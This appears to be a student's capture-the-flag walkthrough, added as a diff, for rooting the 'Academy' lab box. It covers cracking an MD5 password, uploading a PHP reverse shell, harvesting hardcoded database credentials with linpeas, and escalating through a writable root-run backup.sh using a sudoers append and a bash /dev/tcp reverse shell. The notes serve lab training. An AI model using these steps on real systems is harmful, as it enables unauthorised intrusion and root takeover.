@@ -1,0 +1,57 @@
+I) nmap - ftp, ssh, 80
+    ftp - note.txt:
+    INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
+    ('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');
+    The StudentRegno number is what you use for login.
+
+            md5:cd73502828457d15655bbd7a63fb0bc8: student
+
+II) http://<ip>:80
+    a) login with 10201321:student
+    upload revshell.php: change IP/port
+        nc -lnvp 4444
+            home/grimmie/backup.sh
+        python server:
+            python3 -m http.server 80
+                DL EnumLinux.sh/linpeas.sh
+
+   ./linpeas.sh on victim machine:
+            /etc/apache2/sites-available/default-ssl.conf:		#	 file needs this password: `xxj31ZMTZzkVA'.
+            /var/www/html/academy/index.php:$query=mysqli_query($bd, "SELECT * FROM students WHERE StudentRegno='$regno' and password='$password'");
+            /var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
+                $ cat /var/www/html/academy/admin/includes/config.php
+                <?php
+                $mysql_hostname = "localhost";
+                $mysql_user = "grimmie";
+                $mysql_password = "My_V3ryS3cur3_P4ss";
+                $mysql_database = "onlinecourse";
+                $bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
+
+III) mysql -u grimmie -p My_V3ryS3cur3_P4ss:
+                + use onlinecourse; show tables; select * from admin;
+                    |  1 | admin    | 21232f297a57a5a743894a0e4a801fc3 | 2020-01-24 11:21:18 | 29-05-2021 11:46:49 PM |
+                            MD5:21232f297a57a5a743894a0e4a801fc3:admin
+                + deadend
+
+IV) ssh grimmie@<ip>  PW: My_V3ryS3cur3_P4ss
+     a) cat /home/grimmie/backup.sh
+                    zip etc
+     b) crontab -u root -l: must be priviledged to use -u
+          systemctl list-timers:
+                NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTI
+                Sun 2021-12-05 14:39:00 EST  27min left Sun 2021-12-05 14:09:01 EST  2min 58s ago phpsessionclean.timer        phps
+                Mon 2021-12-06 00:00:00 EST  9h left    Sun 2021-12-05 12:40:33 EST  1h 31min ago logrotate.timer              logr
+                *6 timers*
+     c) crontab -e:
+                + */5 * * * * root /home/grimmie/backup.sh (every five minutes .sh will exe)
+     d) vi /home/grimmie/backup.sh:
+                + echo "grimmie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers/ (give grimmie all privs)
+
+IV) Still no root access:
+    a) vi /home/grimmie/backup.sh
+           bash -i >& /dev/tcp/192.168.86.178/8081 0>&1
+    b) listener: nc -lvnp 8081
+           root reverse shell: success
+               flag.txt: Congratz you rooted this box ! Looks like this CMS isn't so secure.
+                         I hope you enjoyed it. If you had any issue please let us know in the course discord.
+                         Happy hacking !
